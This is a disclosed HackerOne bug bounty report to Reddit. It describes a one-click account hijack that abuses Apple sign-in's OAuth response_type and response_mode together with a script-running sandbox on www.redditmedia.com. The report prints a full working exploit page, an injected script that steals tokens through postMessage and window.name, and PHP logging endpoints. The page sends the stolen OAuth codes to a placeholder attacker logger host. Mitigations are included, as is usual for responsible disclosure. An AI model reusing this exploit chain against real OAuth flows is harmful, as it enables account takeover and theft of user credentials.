# One-click account hijack for anyone using Apple sign-in with Reddit, due to response-type switch + leaking href to XSS on www.redditmedia.com

## Report Details
- **Report ID**: 1567186
- **URL**: https://hackerone.com/reports/1567186
- **State**: Closed
- **Severity**: critical
- **Submitted**: 2022-05-12T14:03:26.715Z
- **Disclosed**: 2022-08-02T15:13:53.849Z

## Reporter
- **Username**: fransrosen
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: reddit

## Vulnerability Information
Hi,

# Description

I've been researching new ways to steal OAuth codes and access-tokens using postMessage, and I found a way for me to steal the code and/or access-token from Apple-sign-in on reddit.com allowing a full account hijack of the account in Reddit.

The way it works is this:

1. Attacker prepares a `state`-parameter in its own browser from the regular Apple sign-in flow in Reddit. This is an important part on how we get the code.
2. Attacker makes a page for the victim with the attacker's state attached to it. The page loads an iframe with `www.redditmedia.com`, which is an intentional sandbox but with a fun quirk, it uses `window.name` of the frame to pass over query parameters for the current URL in the main window of Reddit. This also includes fragment, which is what we need to get the tokens.
3. The javascript in the www.redditmedia.com sandbox will create a link to Apple sign-in for Reddit, but tainted with the `state`-value that the attacker set. Also, the `response_type` is modified from `code` to `code+id_token` and the `response_mode` to `fragment`. This is the second important part why we can steal the code, since Reddit uses `response_mode=web_message` live, to get the message as a postMessage from the login popup, but the other response modes in Apple-ID are not disabled by Reddit. **Reddit is not expecting to get any sensitive tokens in the URL fragment.** Also, the `redirect_uri` set in the OAuth-application in Apple for Reddit is allowing `https://reddit.com` only as the return page. This is something you need to remove, or point elsewhere. When you're using `response_mode=web_message`, the `redirect_uri` doesn't really matter what it is set to, since the whole origin of `https://reddit.com` will be allowed to get the postMessage. But since we now can direct the tokens to Reddit's main page, we have the iframe of www.redditmedia.com there to catch the tokens.
4. Victim clicks the link from the attacker page, will go through "sign-in with Apple" for Reddit, but with the attacker's `state`-parameter. When the login process is completed, the URL of the main page becomes `https://reddit.com/#state=xxx&code=xxx&access_token=xx`.
5. The XSS on `www.redditmedia.com` in the first window, which has the same domain as the iframe, will be allowed to ask about the `window.name` of the iframe in the main window, since it's the same origin as the iframe on the attacker's page. It will then be able to steal the current URL that has the tokens in it.

Here's a video to show the flow, as you will see in the beginning - the attacker has the red profile in Chrome. He will open his own session with Apple and copy the state to the attacker-page, and then send the link to the victim (in the gray profile of Chrome). When the code shows up on the attacker's page later, that's where the attacker then takes over again and uses its incognito browser window to sign in as the victim by posting the postMessage from his Apple-ID sign in popup to Reddit:

{F1726830}

And here's a link for testing:

```
https://fransrosen.com/reddit-hijack-424342.html
```

# Technical details

Here's the HTML of the malicious page:

```html
<html>
<style>pre { word-break: break-word; white-space: pre-wrap; }</style>
<body>
<div id="start">
Attacker, enter your Apple ID-OAuth URL when trying to <a href="https://reddit.com" target="_blank">sign in to Reddit here</a>:<br />
<input id="state">
<button onclick="launch(extractstate(document.getElementById('state').value), true)">Generate a victim URL with attacker's state</button>
</div>


<div id="fr"></div>

<script>
var inj, monitor;
function extractstate(st) {
    return st.indexOf('&state=') !== -1 ? st.split('&state=')[1].split('&')[0] : st;
}
function startmonitor(st) {
    history.pushState('/','/',location.pathname + '?monitor&state=' + st)
    monitor = setInterval(function() {
        fetch('https://MY-LOGGER-DOMAIN/reddit/parse.php?q=' + st).then(e => e.text()).then(e => {
            if (e.length) {
                document.getElementById('fr').innerText = 'Attacker, log in to Reddit by running this in the console from Apple-ID popup: ';
                var p = document.createElement('pre');
                p.innerText = 'opener.postMessage(\'' + unescape(e.trim()) + '\',"*");';
                document.getElementById('fr').appendChild(p)
                clearInterval(monitor);
            }
        });
    }, 2000);
}
function launch(st, showonly) {
    if (showonly) {
        history.pushState('/','/',location.pathname + '?state=' + st)
        document.getElementById('fr').innerText = 'Send this link to victim: ';
        var p = document.createElement('pre');
        p.innerText = location.href;
        document.getElementById('fr').appendChild(p);
        startmonitor(st);
    } else {
        document.getElementById('fr').innerHTML = '<iframe src="https://www.redditmedia.com/gtm/jail?id=GTM-N3HH8D6&state=' + encodeURIComponent(st) + '" frameborder=0 style="width: 500px; height: 300px"></iframe>';
    }
    document.getElementById('start').innerHTML = '';
}
if (location.search && location.search.split('state=')[1].split('&')[0]) {
    launch(location.search.split('state=')[1].split('&')[0], location.search.indexOf('monitor') !== -1);
}
window.onmessage = function(e) {
    if (e.data === 'stopinject') {
        console.log('frame injected');
        clearInterval(inj)
    }
    if (e.data.indexOf('id_token') !== -1 || e.data.indexOf('code') !== -1) {
        payload = JSON.parse(e.data);
        data = payload.hash.replace('state=state=', 'state=');
        var state = data.split('state=')[1].split('&')[0];
        var code = data.split('code=')[1].split('&')[0];
        var id_token = data.split('id_token=')[1].split('&')[0];
        var payload = JSON.stringify({method:'oauthDone',data:{authorization:{code:code,id_token:id_token,state:state}}});

        document.getElementById('fr').innerHTML = 'Attacker now have the code from Apple:<br />';
        var p = document.createElement('pre');
        p.innerText = payload;
        document.getElementById('fr').appendChild(p);

        var s = document.createElement('img');
        s.src = 'https://MY-LOGGER-DOMAIN/reddit/log.php?' + payload;
        document.body.appendChild(s);   
    }
}

</script>


</body>
</html>
```

What this page will do is:

1. Ask the attacker to prepare the `state`-param from its own browser. This is to taint the victim's code with the state so that the attacker can then sign in. This will also start to monitor the log asking for any code from the state provided.

{F1726829}

{F1726831}

2. Load the `https://www.redditmedia.com` with my own custom GTM into an iframe. It is not restricted to be framed in any way, anyone can load it.
3. The GTM-script will load, it looks like this:

```html
<script>var b, x;
var state = parent.location.href.substr(location.href.indexOf('state='));
var d = document.createElement('div');
if (!window.inited) {
  window.inited = true;
d.innerHTML = '<a href="#" onclick="b=window.open(\'https://appleid.apple.com/auth/authorize?client_id=com.reddit.RedditAppleSSO&redirect_uri=https%3A%2F%2Fwww.reddit.com&response_type=code+id_token&state=' + state + '&scope=&response_mode=fragment&m=12&v=1.5.4\');">Click here to hijack Apple access-token for Reddit</a>';
parent.document.children[parent.document.children.length - 1].appendChild(d);
if(top!==parent.window) top.postMessage('stopinject', '*');
parent.window.onmessage=function(e) { if(e.data.indexOf('id_token') !== -1 || e.data.indexOf('code') !== -1) { top.postMessage(e.data, '*'); b.close(); } };
x = setInterval(function() {
if(parent.window.b && parent.window.b.frames[0] && parent.window.b.frames[0].window && parent.window.b.frames[0].window.name) {
  top.postMessage(parent.window.b.frames[0].window.name, '*'); parent.window.b.close();
  clearInterval(x);
};

}, 500);
}
</script>
```

4. This javascript will render the "Click here"-link:

{F1726833}

It will ask the parent window to stop injecting by postMessage, and it will run an interval looking for the `frames[1].window.name`, which is the regular www.redditmedia.com iframe of the window that was opened, as soon as it contains `code`, the value will be sent to the attacker main window through this frame. 
5. The attacker's main window will listen for a postMessage containing `code` and will show the state+code in the window. The page will then load an external logging-URL with the payload.

{F1726835}

6. The attacker now gets the token from the victim in his browser thanks to the monitoring of the log on my server:

{F1726836}

## Logging endpoints

I've added some endpoints in the HTML to log and parse the log to extract the code-parameter. You need to use your own endpoints if you don't want to try mine above from my link.

`https://USE-YOUR-OWN-LOGGER/reddit/log.php` looks like this:

```php
<?php

if (isset($_SERVER['QUERY_STRING'])) {
	file_put_contents('r.log', $_SERVER['QUERY_STRING']."\n", FILE_APPEND);
}
```

And `https://USE-YOUR-OWN-LOGGER/reddit/parse.php` looks like this:

```php
<?php
header("Access-Control-Allow-Origin: *");
header("Content-type: text/plain");

$key = @$_GET['q'];
if (!$key || !preg_match('#^[a-f0-9]{48}$#', $key)) { die; }
$data = explode("\n", file_get_contents('r.log'));
foreach($data as $line) {
	if (strpos($line, $key) !== false) {
		echo $line . "\n";
		die;
	}
}
```


# Mitigation

1. Remove fragment part when location is sent to www.redditmedia.com or any other party.
2. Restrict your `redirect_uri` of Apple-ID to something that does not load a domain that could run arbitrary javascript.

## Impact

Attacker can sign in as the victim. There's minimal interaction needed, only one click.

This took quite some time to get built :) I hope you'll like it!

Regards,
Frans

## Attachments
- Screen_Shot_2022-05-12_at_15.52.53.png
- reddit-hijack.mp4
- Screen_Shot_2022-05-12_at_15.52.59.png
- Screen_Shot_2022-05-12_at_15.54.23.png
- Screen_Shot_2022-05-12_at_16.00.54.png
- Screen_Shot_2022-05-12_at_16.00.32.png
